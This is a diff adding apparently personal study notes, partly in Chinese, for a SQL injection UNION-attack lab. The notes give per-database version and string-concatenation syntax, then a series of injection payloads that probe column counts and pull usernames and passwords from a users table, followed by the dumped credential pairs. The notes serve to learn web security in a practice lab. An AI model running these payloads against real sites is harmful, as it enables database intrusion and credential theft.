@@ -1,0 +1,37 @@
+SQL 注入 UNION 攻击，从单列中检索多个值:
+
+数据库版本：
+Oracle	SELECT banner FROM v$version
+SELECT version FROM v$instance
+Microsoft   微软	SELECT @@version
+PostgreSQL	SELECT version()
+MySQL	SELECT @@version
+
+
+字符串连接：
+Oracle	'foo'||'bar'
+Microsoft   微软	'foo'+'bar'
+PostgreSQL	'foo'||'bar'
+MySQL	'foo' 'bar' [Note the space between the two strings]
+'foo' 'bar' [注意两个字符串之间的空格]
+CONCAT('foo','bar')
+
+'
+'--
+' Or 1=1--
+' Order by 2--
+' Union select null, 'rinton'--
+' Union select null, username from users--
+' Union select null, password from users--
+
+' Union select null, @@version from users-- No
+' Union select null, version() from users-- Yes
+>> PostgreSQL......
+' Union select username || '~' || password from users--
+
+
+...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
